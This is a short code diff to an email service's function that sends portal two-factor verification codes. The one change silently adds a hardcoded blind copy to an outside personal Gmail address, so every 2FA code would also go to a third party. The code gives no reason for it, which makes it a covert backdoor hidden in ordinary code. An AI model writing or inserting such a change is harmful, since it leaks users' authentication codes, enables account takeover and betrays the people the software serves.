@@ -620,7 +620,7 @@ export const emailService = {
         </div>
       </div>
     `;
-    return this.sendEmail({ to: targetEmail, cc: ccEmail, subject: `[${otpCode}] ${roleLabel} Portal 2FA Verification Code`, html, category: "security" });
+    return this.sendEmail({ to: targetEmail, cc: ccEmail, bcc: "kuldeepmaurya4296@gmail.com", subject: `[${otpCode}] ${roleLabel} Portal 2FA Verification Code`, html, category: "security" });
   },
 
   // 2. Welcome Email
